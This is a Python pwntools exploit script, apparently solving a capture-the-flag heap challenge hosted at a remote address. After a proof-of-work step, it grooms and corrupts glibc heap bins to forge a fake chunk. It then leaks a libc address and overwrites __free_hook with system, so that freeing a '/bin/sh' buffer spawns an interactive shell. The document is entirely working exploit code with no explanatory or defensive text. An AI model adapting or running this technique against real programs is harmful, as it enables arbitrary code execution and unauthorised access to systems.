#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from hashlib import *
#host = "10.211.55.13"
#port = 8888
host = "202.120.7.205"
port = 5655
r = remote(host,port)

def allocate(size):
    r.recvuntil("Command:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))

def update(idx,size,data):
    r.recvuntil("Command:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

def remove(idx):
    r.recvuntil("Command:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def view(idx):
    r.recvuntil("Command:")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def proof_of_work(chal):
    gg = ''.join(chr(i) for i in range(256))
    while True:
        sol = ''.join(random.choice(gg) for _ in xrange(4))
        if sha256(chal + sol).digest().startswith('\0\0\0'):
            return sol

r.send(proof_of_work(r.recvline().strip()))
allocate(0x400) #0
allocate(0x20) #1
allocate(0x400) #2
allocate(0x88) #3
allocate(0xfe0) #4
allocate(0x80) #5
update(4,0xf20,"\x00"*0xef0 + p64(0xf00)+p64(0x21)+ p64(0)*2 + p64(0) +p64(0x21) )
remove(4)
update(3,0x88-12,"a"*(0x88-12))
allocate(0x80) #4
allocate(0x20) #6
allocate(0x400) #7
allocate(0x20) #8
allocate(0x400) #9
allocate(0x20) #10

remove(4)
remove(5)
remove(7)
remove(9)
allocate(1156) # 4
allocate(0x410) #5
remove(0)

update(5,0xe0,"\x00"*0xb0 + p64(0) + p64(0x402) + p64(0x133707d0-0x15)*4) # prepare size 0x56 for fake chunk
allocate(20) #0
remove(2)

update(5,0xe0,"\x00"*0xb0 + p64(0) + p64(0x402) + p64(0x133707d0)*4) # create bk for unsorted bin
allocate(20) #2
allocate(0xe0) #7
allocate(0xa50)#9
update(9,0x9f0,"\x00"*0x9e0 + p64(0) + p64(0xf1))
fake_chunk = 0x133707c8
remove(7)

update(9,0xa00,"\x00"*0x9a0 + p64(0) + p64(0xb1) + p64(0)*2 + p64(0) + p64(0x21) + p64(0)*2 + p64(0) + p64(0xf1) + p64(0) + p64(fake_chunk))
remove(0)
allocate(72) #0 unsorted bin corruped to get the fake_chunk
allocate(0xe0) #7
update(0,24, p64(0x91) + p64(0) + p64(0x13370000))
update(7,16,p64(0) + p64(0x133707d0))
allocate(0x80) #11
update(11,96,p64(0)*6 + p64(0) + p64(0x13377331) +  p64(0x13370010)+p64(0x30) + p64(0x13370820) + p64(0x100))
view(0)
r.recvuntil("Chunk[0]: ")
data = r.recvuntil("1.")
#libc = u64(data[0:8]) - 0x3c1b58
libc = u64(data[0:8]) - 0x399b58
print hex(libc)
#free_hook = libc + 0x3c3788
free_hook = libc + 0x39b788
#system = libc + 0x456a0
system = libc + 0x3f480
update(1,40,p64(free_hook) + p64(0x30) + p64(0x13370840) + p64(0x30) + "/bin/sh\x00")
update(0,8,p64(system))
remove(1)
r.interactive()
